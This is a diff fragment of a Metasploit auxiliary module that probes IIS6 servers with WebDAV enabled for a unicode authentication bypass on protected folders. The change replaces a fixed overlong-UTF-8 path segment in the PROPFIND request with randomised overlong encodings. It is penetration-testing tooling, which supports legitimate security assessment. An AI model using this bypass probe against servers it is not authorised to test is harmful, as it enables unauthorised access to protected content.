@@ -132,8 +132,9 @@ class Metasploit3 < Msf::Auxiliary
 					print_status("Found protected folder #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})")
 					print_status("\tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.")
 					
+					bogus = Rex::Text.to_unicode( Rex::Text.rand_text(Kernel.rand(32)), 'utf-8', 'overlong', 1+(Kernel.rand(6)) )
 					res = send_request_cgi({
-						'uri'  		=>  tpath + '%c0%af' + testfdir,
+						'uri'  		=>  tpath + bogus + testfdir,
 						'method'   	=> 'PROPFIND',
 						'ctype'		=> 'application/xml',
 						'headers' 	=> 
